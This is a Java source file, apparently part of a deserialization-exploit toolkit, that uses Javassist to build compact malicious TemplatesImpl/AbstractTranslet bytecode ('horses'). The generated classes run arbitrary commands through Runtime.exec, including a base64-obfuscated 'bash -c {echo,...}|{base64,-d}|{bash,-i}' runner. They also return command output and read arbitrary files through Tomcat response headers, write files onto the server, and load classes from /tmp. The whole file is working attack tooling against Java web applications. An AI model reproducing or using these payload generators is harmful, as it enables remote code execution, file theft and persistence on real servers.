package unknown.memshell;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import unknown.Gadget;

import java.lang.reflect.Field;
import java.util.Arrays;
import java.util.Base64;
import java.util.Scanner;


/**
 缩短payload长度的马
 */
public class SmallShell {

    public static byte[] readObjectHorse(String filename) throws Exception{
        String s = "public A(){\n" +
                "\ttry {\n" +
                "            java.io.InputStream in = new java.io.FileInputStream(\""+filename+"\");\n" +
                "            java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();\n" +
                "            byte[] buffer = new byte[4096];\n" +
                "            int n = 0;\n" +
                "            while((n = in.read(buffer)) != -1) {\n" +
                "                out.write(buffer, 0, n);\n" +
                "            }\n" +
                "            byte[] data =  out.toByteArray();\n" +
                "            byte[] decodeBytes = java.util.Base64.getDecoder().decode(data);\n" +
                "            new java.io.ObjectInputStream(new java.io.ByteArrayInputStream(decodeBytes)).readObject();\n" +
                "        } catch (Exception e) {\n" +
                "    }\n" +
                "}";
        return makeByte(s);
    }
    public static byte[] urlLoaderHorse(String filename) throws Exception{
        String s = "public A(){\n" +
                "    try {\n" +
                "           String path = \"file:///tmp/\";\n" +
                "           java.net.URL url = new java.net.URL(path);\n" +
                "           java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]{url});\n" +
                "           Class clazz = urlClassLoader.loadClass(\""+filename+"\");" +
                "           clazz.newInstance();" +
                "       } catch (Exception ignored) {" +
                "    }\n" +
                "}\n";
        return makeByte(s);
    }
    public static byte[] contextloaderHorse(String filename) throws Exception{
        String s = "public A(){\n" +
                "    try {\n" +
                "           String path = \"file:///tmp/\";\n" +
                "           java.net.URL url = new java.net.URL(path);\n" +
                "           java.net.URLClassLoader urlClassLoader = new java.net.URLClassLoader(new java.net.URL[]{url},Thread.currentThread().getContextClassLoader());\n" +
                "           Class clazz = urlClassLoader.loadClass(\""+filename+"\");" +
                "           clazz.newInstance();" +
                "       } catch (Exception ignored) {" +
                "    }\n" +
                "}\n";
        return makeByte(s);
    }

    public static byte[] makeByte(String src) throws Exception{
        ClassPool classPool = ClassPool.getDefault();
        classPool.importPackage(Scanner.class.getName());
        CtClass ctClass = classPool.get(AbstractTranslet.class.getName());
        CtClass calc = classPool.makeClass("A");
        calc.setSuperclass(ctClass);
        CtConstructor ctConstructor = CtNewConstructor.make(src, calc);
        calc.addConstructor(ctConstructor);
        byte[] bytes = calc.toBytecode();
        calc.defrost();
        return bytes;
    }

    public static byte[] rceHorseCmd(String cmd) throws Exception{
        String s = "public A(){          try {\n" +
                "            Runtime.getRuntime().exec(\""+cmd+"\");\n" +
                "        } catch (Exception e) {\n" +
                "            \n" +
                "        }             " +
                "}";
        return makeByte(s);
    }
    public static byte[] rceHorseBash(String cmd) throws Exception{
        cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
        String s = "public A(){          try {\n" +
                "            Runtime.getRuntime().exec(\"bash -c {echo,"+cmd+"}|{base64,-d}|{bash,-i}\");\n" +
                "        } catch (Exception e) {\n" +
                "            \n" +
                "        }             " +
                "}";
        return makeByte(s);
    }
    public static byte[] rceWithResultHorse(String cmd) throws Exception{
        cmd = Base64.getEncoder().encodeToString(cmd.getBytes());
        String s = "public A(){\n" +
                "\tjavax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "\t\n" +
                "\tjava.lang.reflect.Field r=request.getClass().getDeclaredField(\"request\");\n" +
                "\t\n" +
                "    r.setAccessible(true);\n" +
                "    org.apache.catalina.connector.Response response = ((org.apache.catalina.connector.Request)r.get(request)).getResponse();\n" +
                "    \n" +
                "    String s =new Scanner(Runtime.getRuntime().exec(\"bash -c {echo,"+cmd+"}|{base64,-d}|{bash,-i}\").getInputStream()).next();\n" +
                "    response.setHeader(\"c\", s);\n" +
                "}";
        return makeByte(s);
    }
    public static byte[] writeHorse(byte[] bytes,String filename) throws Exception{

        String data = Arrays.toString(bytes).replace('[', '{').replace(']', '}');
        String s = "public A(){\n" +
                "   try {\n" +
                "       String path = \""+filename+"\";\n" +
                "       java.io.File file = new java.io.File(path);\n" +
                "       java.io.FileOutputStream fos = new java.io.FileOutputStream(path, true);\n" +
                "       byte[] data = "+data+";\n" +
                "       fos.write(data);\n" +
                "       fos.close();\n" +
                "   } catch (Exception ignore) {\n" +
                "   }\n" +
                "}";
        return makeByte(s);
    }
    public static byte[] writeHorse(String data,String filename) throws Exception{

        String s = "public A(){\n" +
                "   try {\n" +
                "       String path = \""+filename+"\";\n" +
                "       java.io.File file = new java.io.File(path);\n" +
                "       java.io.FileOutputStream fos = new java.io.FileOutputStream(path, true);\n" +
                "       String data = \""+data+"\";\n" +
                "       fos.write(data.getBytes());\n" +
                "       fos.close();\n" +
                "   } catch (Exception ignore) {\n" +
                "   }\n" +
                "}";
        return makeByte(s);
    }

    public static byte[] readFileHorse(String filename) throws Exception{

        String s = "public A(){\n" +
                "\tjavax.servlet.http.HttpServletRequest request = ((org.springframework.web.context.request.ServletRequestAttributes)org.springframework.web.context.request.RequestContextHolder.getRequestAttributes()).getRequest();\n" +
                "\tjava.lang.reflect.Field r=request.getClass().getDeclaredField(\"request\");\n" +
                "    r.setAccessible(true);\n" +
                "    org.apache.catalina.connector.Response response = ((org.apache.catalina.connector.Request)r.get(request)).getResponse();\n" +
                "    \n" +
                "    response.setHeader(\"b\",new java.util.Scanner(new java.io.File(\""+filename+"\")).next());\n" +
                "}";
        return makeByte(s);
    }
}
